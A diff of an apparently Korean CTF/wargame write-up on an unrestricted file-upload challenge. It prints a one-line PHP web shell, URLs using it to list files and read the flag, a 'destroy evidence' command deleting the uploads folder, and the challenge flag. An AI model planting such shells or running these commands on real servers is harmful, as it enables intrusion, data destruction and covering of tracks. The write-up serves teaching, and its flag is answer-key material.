@@ -1,59 +1,37 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 9. File Uploaded"
+title: "KnockOn Bootcamp 2nd - 9. Unrestricted File Upload"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - File Upload
-  - Command Injection
-last_modified_at: 2024-09-15T18:30:00-05:00
+  - Unrestricted File Upload
+  - Web Shell
+last_modified_at: 2024-09-16T08:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10007/>
 
-![9. File Uploaded 1](/assets/images/writeup/web-hacking/knock-on/9_FILE_1.png)
+![9. File Uploaded 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-1.png)
 
-![9. File Uploaded 2](/assets/images/writeup/web-hacking/knock-on/9_FILE_2.png)
-
-|
-
-|
-
-|
+![9. File Uploaded 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-2.png)
 
 ### 목표
 
----
-
 서버 파일에서 flag 찾기
-
-|
 
 ### 공격 기법
 
----
-
 File Upload
-
-Command Injection
-
-|
-
-|
-
-|
+- Unrestricted File Upload
+- Web Shell
 
 ## 문제 코드
 
 ### upload.php
-
----
 
 ```php
 <?php
@@ -137,13 +115,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' and $_POST['title'] and $_POST['content
 
 파일 확장자에 대한 필터링이 없음
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```php
 <?php
@@ -155,47 +127,37 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' and $_POST['title'] and $_POST['content
 
 `id` 파라미터를 통해 서버에 `명령어`를 실행할 수 있음
 
-|
-
-![9. File Uploaded 3](/assets/images/writeup/web-hacking/knock-on/9_FILE_3.png)
+![9. File Uploaded 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-3.png)
 
 웹 쉘 파일을 업로드하면 파일명이 나옴. 복붙
 
 파일 경로로 들어가면 파일이 실행되어 파일에 담긴 웹 쉘 코드가 실행됨
 
-|
-
 ```bash
 http://war.knock-on.org:10007/uploads/file_66e0e6517b6e37.93809256.php?id=ls
 ```
 
-![9. File Uploaded 4](/assets/images/writeup/web-hacking/knock-on/9_FILE_4.png)
+![9. File Uploaded 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-4.png)
 
 `?id=ls` 방금 업로드한 파일이 나타남
 
 `id`파라미터로 서버에 명령을 내릴 수 있게됨
 
-|
-
 ```bash
 ?id=ls ..
 ```
 
-![9. File Uploaded 5](/assets/images/writeup/web-hacking/knock-on/9_FILE_5.png)
+![9. File Uploaded 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-5.png)
 
 상위 경로로 가면 `flag`파일이 있음
-
-|
 
 ```bash
 ?id=cat ../flag
 ```
 
-![9. File Uploaded 6](/assets/images/writeup/web-hacking/knock-on/9_FILE_6.png)
+![9. File Uploaded 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-9-file-6.png)
 
 `cat`으로 `flag` 출력
-
-|
 
 ```bash
 ?id=rm -r ../uploads/*
@@ -203,17 +165,9 @@ http://war.knock-on.org:10007/uploads/file_66e0e6517b6e37.93809256.php?id=ls
 
 마무리로 증거인멸
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### test.php
-
----
 
 ```php
 <?php
@@ -221,28 +175,14 @@ echo system($_GET['id'])
 ?>
 ```
 
-|
-
 ### url
-
----
 
 ```python
 http://war.knock-on.org:10007/uploads/file_66e0e33fa34cf4.08493015.php?id=cat ../flag
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```bash
 KO{upl04d_w1th0ut_ch3ck_1s_d4ng3r0us}
 ```
-
-|
-
----
